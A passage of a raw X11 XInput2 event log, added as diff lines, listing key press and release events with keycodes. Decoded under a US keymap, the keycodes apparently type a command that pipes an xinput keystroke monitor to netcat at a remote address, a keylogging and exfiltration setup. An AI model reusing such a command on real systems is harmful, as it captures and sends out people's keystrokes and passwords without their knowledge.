+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 26
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 26
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 39
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 39
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 39
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 39
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 28
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 28
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 28
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 28
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 20
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 20
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 20
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 20
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 53
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 53
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 53
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 53
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 31
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 31
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 31
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 31
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 11
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 11
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 11
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 11
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 65
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 65
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 65
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 65
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 20
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 20
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 20
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 20
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 20
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 20
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 20
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 20
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 27
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 27
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 27
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 27
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 32
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 32
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 32
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 32
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 32
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 32
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 32
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 32
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 28
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 28
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 28
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 28
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 65
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 65
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 65
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 65
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 50
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 50
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 51
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 51
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0x1 effective: 0x1
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 51
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 51
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0x1 effective: 0x1
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 50
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 50
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0x1 effective: 0x1
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 65
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 65
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 65
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 65
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 57
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 57
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 57
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 57
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 54
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 54
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 54
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 54
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 65
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 65
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 65
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 65
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 10
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 10
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 10
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 10
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 19
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 19
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 19
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 19
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 60
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 60
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 60
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 60
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 10
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 10
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 10
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 10
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 60
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 60
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 60
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 60
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 10
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 10
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 10
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 10
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 12
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 12
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 12
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 12
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 60
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 60
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 60
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 60
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 10
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 10
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 10
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 10
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 16
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 16
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 16
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 16
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 17
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 17
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 17
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 17
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 65
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 65
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 65
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 65
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 13
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 13
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 13
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 13
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 13
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 13
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 13
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 13
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 13
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 13
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 13
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 13
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
